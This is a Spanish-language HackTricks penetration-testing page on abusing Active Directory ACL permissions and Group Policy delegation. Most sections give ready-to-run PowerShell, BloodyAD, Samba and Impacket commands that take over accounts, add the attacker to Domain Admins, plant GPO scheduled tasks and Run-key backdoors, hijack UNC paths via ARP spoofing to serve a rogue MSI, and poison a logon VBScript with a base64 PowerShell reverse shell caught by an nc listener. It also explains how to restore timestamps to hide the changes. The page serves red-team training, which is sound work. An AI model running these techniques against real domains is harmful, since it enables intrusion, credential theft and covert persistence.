# Abuso de ACL/ACE de Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Esta página es principalmente un resumen de las técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **y** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para más detalles, consulta los artículos originales.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Derechos GenericAll sobre un usuario**

Este privilegio otorga a un atacante control total sobre la cuenta de usuario objetivo. Una vez confirmados los derechos `GenericAll` mediante el comando `Get-ObjectAcl`, un atacante puede:

- **Cambiar la contraseña del objetivo**: mediante `net user <username> <password> /domain`, el atacante puede restablecer la contraseña del usuario.
- Desde Linux, puedes hacer lo mismo mediante SAMR con Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Si la cuenta está deshabilitada, elimina el flag UAC**: `GenericAll` permite editar `userAccountControl`. Desde Linux, BloodyAD puede eliminar el flag `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Asigna un SPN a la cuenta del usuario para hacerla kerberoastable y, después, usa Rubeus y targetedKerberoast.py para extraer e intentar crackear los hashes del ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Deshabilitar la preautenticación del usuario, haciendo que su cuenta sea vulnerable a ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Con `GenericAll` sobre un usuario, puedes añadir una credencial basada en certificado y autenticarte como ese usuario sin cambiar su contraseña. Consulta:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Derechos GenericAll sobre un grupo**

Este privilegio permite a un atacante manipular las membresías de los grupos si tiene derechos `GenericAll` sobre un grupo como `Domain Admins`. Después de identificar el nombre distintivo del grupo con `Get-NetGroup`, el atacante puede:

- **Añadirse al grupo Domain Admins**: Esto puede hacerse mediante comandos directos o utilizando módulos como Active Directory o PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Desde Linux también puedes aprovechar BloodyAD para agregarte a grupos arbitrarios cuando tengas permisos de membresía GenericAll/Write sobre ellos. Si el grupo objetivo está anidado en “Remote Management Users”, obtendrás inmediatamente acceso WinRM a los hosts que respeten ese grupo:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write en Computer/User**

Tener estos privilegios sobre un objeto de equipo o una cuenta de usuario permite:

- **Kerberos Resource-based Constrained Delegation**: Permite tomar el control de un objeto de equipo.
- **Shadow Credentials**: Usar esta técnica para suplantar una cuenta de equipo o usuario mediante la explotación de los privilegios para crear shadow credentials.

## **WriteProperty en un grupo**

Si un usuario tiene derechos `WriteProperty` sobre todos los objetos de un grupo específico (por ejemplo, `Domain Admins`), puede:

- **Añadirse al grupo Domain Admins**: Se puede lograr combinando los comandos `net user` y `Add-NetGroupUser`; este método permite la escalada de privilegios dentro del dominio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Este privilegio permite a los atacantes agregarse a sí mismos a grupos específicos, como `Domain Admins`, mediante comandos que manipulan directamente la pertenencia a grupos. La siguiente secuencia de comandos permite agregarse a sí mismos:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilegio similar permite a los atacantes agregarse directamente a grupos modificando las propiedades de estos si tienen el permiso `WriteProperty` sobre dichos grupos. La confirmación y ejecución de este privilegio se realizan con:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Tener el `ExtendedRight` sobre un usuario para `User-Force-Change-Password` permite realizar resets de password sin conocer el password actual. La verificación de este derecho y su explotación pueden realizarse mediante PowerShell o herramientas alternativas de línea de comandos, ofreciendo varios métodos para resetear el password de un usuario, incluidas sesiones interactivas y one-liners para entornos no interactivos. Los comandos van desde invocaciones sencillas de PowerShell hasta el uso de `rpcclient` en Linux, lo que demuestra la versatilidad de los vectores de ataque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner en un grupo**

Si un atacante descubre que tiene derechos `WriteOwner` sobre un grupo, puede cambiar la propiedad del grupo para convertirse en su propietario. Esto resulta especialmente grave cuando el grupo en cuestión es `Domain Admins`, ya que cambiar la propiedad permite un mayor control sobre los atributos y la pertenencia del grupo. El proceso implica identificar el objeto correcto mediante `Get-ObjectAcl` y, a continuación, usar `Set-DomainObjectOwner` para modificar el propietario, ya sea mediante el SID o el nombre.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite en un usuario**

Este permiso permite a un atacante modificar las propiedades de un usuario. Específicamente, con acceso `GenericWrite`, el atacante puede cambiar la ruta del script de inicio de sesión de un usuario para ejecutar un script malicioso cuando este inicie sesión. Esto se logra mediante el comando `Set-ADObject`, actualizando la propiedad `scriptpath` del usuario objetivo para que apunte al script del atacante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite en un Group**

Con este privilegio, los atacantes pueden manipular la pertenencia a grupos, por ejemplo, agregándose a sí mismos u otros usuarios a grupos específicos. Este proceso implica crear un objeto de credenciales, usarlo para agregar o eliminar usuarios de un grupo y verificar los cambios de pertenencia con comandos de PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Desde Linux, Samba `net` puede agregar/eliminar miembros cuando tienes `GenericWrite` sobre el grupo (útil cuando PowerShell/RSAT no están disponibles):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Ser propietario de un objeto de AD y tener privilegios `WriteDACL` sobre él permite a un atacante concederse privilegios `GenericAll` sobre el objeto. Esto se consigue mediante la manipulación de ADSI, lo que permite obtener control total sobre el objeto y modificar sus pertenencias a grupos. A pesar de ello, existen limitaciones al intentar explotar estos privilegios mediante los cmdlets `Set-Acl` / `Get-Acl` del módulo de Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Toma de control rápida de WriteDACL/WriteOwner (PowerView)

Cuando tienes `WriteOwner` y `WriteDacl` sobre un usuario o una cuenta de servicio, puedes tomar el control total y restablecer su contraseña usando PowerView sin conocer la contraseña anterior:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notas:
- Es posible que primero debas cambiar el propietario a ti mismo si solo tienes `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validate el acceso con cualquier protocolo (SMB/LDAP/RDP/WinRM) después de restablecer la contraseña.

## **Replication on the Domain (DCSync)**

El ataque DCSync aprovecha permisos específicos de replicación en el dominio para imitar a un Domain Controller y sincronizar datos, incluidas las credenciales de usuario. Esta potente técnica requiere permisos como `DS-Replication-Get-Changes`, lo que permite a los atacantes extraer información confidencial del entorno de AD sin acceso directo a un Domain Controller.<sup>[[5]](#references)</sup> [**Obtén más información sobre el ataque DCSync aquí.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

El acceso delegado para administrar Group Policy Objects (GPOs) puede presentar riesgos de seguridad significativos. Por ejemplo, si a un usuario como `offense\spotless` se le delegan derechos de administración de GPO, puede tener privilegios como **WriteProperty**, **WriteDacl** y **WriteOwner**. Estos permisos pueden abusarse con fines maliciosos, como se identificó usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Para identificar GPOs mal configuradas, se pueden encadenar los cmdlets de PowerSploit. Esto permite descubrir las GPOs que un usuario específico tiene permisos para administrar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Es posible determinar a qué equipos se aplica una GPO específica, lo que ayuda a comprender el alcance del posible impacto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Para ver qué políticas se aplican a un equipo concreto, se pueden utilizar comandos como `Get-DomainGPO`.

**OUs with a Given Policy Applied**: La identificación de las unidades organizativas (OUs) afectadas por una política determinada puede realizarse usando `Get-DomainOU`.

También puedes usar la herramienta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs y encontrar problemas en ellas.

### Abuse GPO - New-GPOImmediateTask

Las GPOs mal configuradas pueden explotarse para ejecutar código, por ejemplo, creando una tarea programada inmediata. Esto puede hacerse para añadir un usuario al grupo de administradores locales en los equipos afectados, elevando significativamente los privilegios:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Módulo GroupPolicy - Abuse GPO

El módulo GroupPolicy, si está instalado, permite crear y vincular nuevos GPO, así como establecer preferencias, como valores del registro, para ejecutar backdoors en los equipos afectados. Este método requiere que el GPO se actualice y que un usuario inicie sesión en el equipo para que se ejecute:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuso de GPO

SharpGPOAbuse ofrece un método para abusar de GPO existentes añadiendo tareas o modificando configuraciones sin necesidad de crear nuevas GPO. Esta herramienta requiere modificar GPO existentes o utilizar herramientas RSAT para crear nuevas antes de aplicar cambios:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzar la actualización de políticas

Las actualizaciones de GPO suelen producirse aproximadamente cada 90 minutos. Para acelerar este proceso, especialmente después de implementar un cambio, se puede utilizar el comando `gpupdate /force` en el equipo objetivo para forzar una actualización inmediata de las políticas. Este comando garantiza que cualquier modificación en las GPO se aplique sin esperar al siguiente ciclo de actualización automática.

### Bajo el capó

Al inspeccionar las Scheduled Tasks de una GPO determinada, como `Misconfigured Policy`, se puede confirmar la adición de tareas como `evilTask`. Estas tareas se crean mediante scripts o herramientas de línea de comandos con el objetivo de modificar el comportamiento del sistema o escalar privilegios.

La estructura de la tarea, tal como se muestra en el archivo de configuración XML generado por `New-GPOImmediateTask`, describe los detalles de la Scheduled Task, incluido el comando que se ejecutará y sus desencadenadores. Este archivo representa cómo se definen y administran las Scheduled Tasks dentro de las GPO, proporcionando un método para ejecutar comandos o scripts arbitrarios como parte de la aplicación de políticas.

### Usuarios y grupos

Las GPO también permiten manipular las pertenencias de usuarios y grupos en los sistemas objetivo. Al editar directamente los archivos de políticas Users and Groups, los atacantes pueden añadir usuarios a grupos privilegiados, como el grupo local `administrators`. Esto es posible mediante la delegación de permisos de administración de GPO, que permite modificar los archivos de políticas para incluir nuevos usuarios o cambiar las pertenencias de los grupos.

El archivo de configuración XML de Users and Groups describe cómo se implementan estos cambios. Al añadir entradas a este archivo, se pueden conceder privilegios elevados a usuarios específicos en todos los sistemas afectados. Este método ofrece un enfoque directo para la escalada de privilegios mediante la manipulación de GPO.

Además, también se pueden considerar otros métodos para ejecutar código o mantener la persistencia, como aprovechar scripts de inicio y cierre de sesión, modificar claves del registro para autorun, instalar software mediante archivos `.msi` o editar configuraciones de servicios. Estas técnicas ofrecen varias vías para mantener el acceso y controlar los sistemas objetivo mediante el abuso de GPO.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` sobre una OU/dominio permite modificar el atributo `gPLink` del contenedor objetivo y **forzar la aplicación de una GPO existente** sin editar la propia GPO. Esto resulta interesante cuando la GPO vinculada ya hace referencia a contenido remoto mediante **UNC paths** (`\\HOST\share\...`), ya que los usuarios autenticados pueden leer **SYSVOL** y buscar políticas reutilizables sin conexión.<sup>[[11]](#references)</sup>

Flujo de trabajo de alto nivel:

1. Utiliza BloodHound para identificar una entidad principal con `WriteGPLink` sobre una OU y enumerar los equipos/usuarios que se encuentran dentro de esa OU.
2. Clona `SYSVOL` en modo de solo lectura y analiza las GPO en busca de **Software Installation**, **mapeos de unidades** (`Drives.xml`) y **scripts de inicio de sesión/inicio del sistema** que hagan referencia a UNC paths.
3. Da preferencia a las políticas que apunten a un **hostname directo** (por ejemplo, `\\DC02\share\pkg.msi`) en lugar de paths de DFS/namespace de dominio, porque los paths basados en hostname son más fáciles de redirigir mediante spoofing L2.
4. Añade el GUID de la GPO seleccionada a `gPLink` de la OU objetivo para que la víctima procese esa política ya existente.
5. En el mismo dominio de broadcast, realiza ARP spoofing del host UNC y vincula su IP localmente (`ip addr add <target_ip>/32 dev <iface>`) para que el tráfico SMB de la víctima llegue a tu host.
6. Sirve el path/nombre de archivo esperado desde un servidor SMB del atacante (por ejemplo, `smbserver.py`) y espera al procesamiento normal de las políticas.

Ejemplo de recopilación de `SYSVOL` y correlación de GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Vincula la GPO existente a la OU objetivo:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Si la GPO vinculada implementa un MSI desde una ruta UNC, el cliente lo obtendrá durante el **inicio del equipo** y lo instalará como **`NT AUTHORITY\SYSTEM`**. Al suplantar el host referenciado y servir un MSI malicioso bajo el **mismo recurso compartido/ruta/nombre**, puedes convertir `WriteGPLink` en ejecución de código como SYSTEM **sin modificar SYSVOL**.

Restricciones importantes:

- **El tiempo es importante**: el nuevo vínculo se detecta durante la actualización de directivas (comúnmente cada ~90 minutos), pero **Software Installation** normalmente se activa durante el **reinicio**.
- Windows Installer normalmente realiza el seguimiento de la implementación mediante el **`ProductCode`** del paquete. Si el producto ya está instalado, la implementación puede omitirse.
- Para evitar el rechazo del instalador, modifica el MSI rogue para que sus valores **`ProductCode`** y **`PackageCode`** coincidan con los del paquete legítimo esperado por la GPO.
- Los archivos de anuncio `.aas` antiguos pueden permanecer en `SYSVOL`, así que valida que la implementación siga pareciendo activa antes de depender de ella.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Las asignaciones de unidades GPP en `Drives.xml` hacen que los usuarios se autentiquen en la ruta UNC configurada durante el inicio de sesión o la reconexión. Si suplantas el host referenciado, puedes capturar **NetNTLMv2**. Si haces que SMB falle deliberadamente, Windows puede reintentar mediante **WebDAV**, enviando **NTLM over HTTP**, lo que resulta mucho más flexible para realizar relays hacia **LDAP(S)**, **AD CS** o **SMB**.

#### Logon/startup script UNC hijack

El mismo patrón se aplica a los scripts alojados en UNC descubiertos en `SYSVOL`:

- Los **Logon scripts** normalmente se ejecutan en el contexto del **usuario**.
- Los **Startup scripts** normalmente se ejecutan en el contexto del **equipo / SYSTEM**.

Si la ruta del script apunta a un hostname suplantable, redirige el host UNC y sirve contenido de script sustituto desde la ubicación esperada.

## SYSVOL/NETLOGON Logon Script Poisoning

Las rutas escribibles bajo `\\<dc>\SYSVOL\<domain>\scripts\` o `\\<dc>\NETLOGON\` permiten manipular los logon scripts ejecutados cuando los usuarios inician sesión mediante GPO. Esto proporciona ejecución de código en el contexto de seguridad de los usuarios que inician sesión.

### Localizar logon scripts
- Inspecciona los atributos de usuario para encontrar un logon script configurado:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Recorre los recursos compartidos del dominio para detectar accesos directos o referencias a scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analiza los archivos `.lnk` para resolver objetivos que apuntan a SYSVOL/NETLOGON (técnica útil de DFIR y para atacantes sin acceso directo a GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound muestra el atributo `logonScript` (`scriptPath`) en los nodos de usuario cuando está presente.

### Validar el acceso de escritura (no confíes en los listados de recursos compartidos)
Las herramientas automatizadas pueden mostrar SYSVOL/NETLOGON como de solo lectura, pero las ACLs de NTFS subyacentes aún pueden permitir escrituras. Prueba siempre:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Si el tamaño del archivo o el mtime cambia, tienes permisos de escritura. Conserva los originales antes de modificarlos.

### Envenena un VBScript de inicio de sesión para RCE
Añade un comando que inicie un reverse shell de PowerShell (genéralo desde revshells.com) y conserva la lógica original para evitar interrumpir la función empresarial:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Escucha en tu host y espera el próximo inicio de sesión interactivo:
```bash
rlwrap -cAr nc -lnvp 443
```
Notas:
- La ejecución se realiza bajo el token del usuario que inició sesión (no SYSTEM). El alcance es el vínculo de la GPO (OU, sitio, dominio) que aplica ese script.
- Limpia restaurando el contenido y las marcas de tiempo originales después de usarlo.


## Referencias

- [1] [Abusing Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Cuentas privilegiadas y privilegios de token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Actualización de las rutas de ataque ACL](https://wald0.com/?p=112)
- [4] [Enumeración ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Escalado de privilegios con ACLs en Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Búsqueda de privilegios y cuentas privilegiadas de Active Directory](https://adsecurity.org/?p=3658)
- [7] [Constructor de ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – operaciones de atributos/UAC de AD desde Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (pertenencia a grupos)](https://www.samba.org/)
- [10] [HTB Puppy: abuso de ACLs de AD, cracking de Argon2 de KeePassXC y descifrado de DPAPI hasta obtener admin del DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: secuestro de rutas UNC de GPO para ejecución de código y NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
